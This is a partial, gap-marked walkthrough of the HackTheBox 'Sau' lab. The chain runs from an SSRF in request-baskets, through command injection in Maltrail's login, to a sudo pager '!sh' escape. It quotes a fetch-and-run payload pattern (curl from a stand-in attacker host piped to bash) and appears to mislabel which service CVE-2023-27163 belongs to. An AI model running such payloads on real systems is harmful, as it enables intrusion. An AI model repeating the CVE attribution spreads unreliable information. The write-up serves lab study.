# HackTheBox — Sau

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: ssrf, csrf, command-injection](https://img.shields.io/badge/Tags-SSRF%20%7C%20CSRF%20%7C%20Cmd%20Injection-orange)

> 🚧 **[incomplete — original notes are bullet-point fragments; key references and commands preserved]**

---

## Attack Chain at a Glance

```
nmap → port 80 + 8338 filtered, 55555/tcp = request-baskets service
   → SSRF in request-baskets (forward URL) to access internal Maltrail on :80
   → Maltrail CSRF → Command Injection (CVE-2023-27163)
   → reverse shell via curl | bash
   → sudo -l → run something as root inside log reader → !sh shell escape → root
```

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt <target>
```

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 302 Found
|     Location: /web
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
```

| Port  | Service | Notes |
|-------|---------|-------|
| 22    | SSH     | OpenSSH 8.2p1 |
| 80    | HTTP    | filtered (internal-only) |
| 8338  | ?       | filtered (internal-only) |
| 55555 | HTTP    | redirects to `/web`; error mentions "basket" → **request-baskets** |

The 400-error string `invalid basket name` identifies the service as [**request-baskets**](https://github.com/darklynx/request-baskets) — an HTTP request collector with a known SSRF (CVE-2023-27172).

---

## Initial Foothold

> 🚧 **[gap]** — original notes don't document the request-baskets SSRF step in detail. The standard path is:
> 1. Create a basket on `:55555`.
> 2. Configure its `forward_url` to point at `http://127.0.0.1:80`.
> 3. Requests to your basket are proxied to the internal Maltrail instance on port 80, giving access despite the firewall.

This exposes a Maltrail web interface internally.

---

## RCE — CVE-2023-27163 (Maltrail Command Injection)

Maltrail's login endpoint passes the `username` parameter into a shell command unsanitized. References from the original notes:

- [Gist PoC by b33t1e](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3#file-cve-2023-27163-L39)
- [huntr.dev disclosure](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)

Original notes describe the payload pattern as:

> **"Curl reverse shell and pipe to bash"** — i.e. a payload of the form `;curl http://attacker/shell.sh|bash;` injected into the username field.

> 🚧 **[gap]** — exact payload string and listener setup not preserved.

---

## User Flag

> 🚧 **[incomplete]** — landing user not explicitly documented; presumably `puma` (the user that Maltrail runs as).

---

## Privilege Escalation

From original notes:

> **"for root sudo -l, sudo that command, while in log reader `!sh`"**

Reading between the lines: `sudo -l` shows a sudo rule allowing the user to run a log-reading utility (likely `systemctl status` or similar) as root. While inside the pager (`less` / `more`), the `!sh` shell-escape hands back a root shell.

> 🚧 **[gap]** — exact sudo rule and binary not documented.

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

> 🚧 **[incomplete]**. Candidate themes from the chain:
> - Filtered ports aren't unreachable when there's a public SSRF primitive that proxies into them.
> - "Internal-only" services (like Maltrail here) are often less hardened than public ones — they assume the network does the access control.
> - `less`/`more`/`vi` pager invocations under sudo are classic GTFOBins shell-escape vectors; check the sudo rule's tail end as much as the binary it names.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port discovery |
| [request-baskets](https://github.com/darklynx/request-baskets) | The vulnerable service on `:55555` (SSRF) |
| [CVE-2023-27163 PoC (b33t1e gist)](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3) | Maltrail command-injection RCE |
| [huntr.dev disclosure](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) | Vulnerability writeup |
| [GTFOBins](https://gtfobins.github.io/) | Pager `!sh` shell-escape technique |
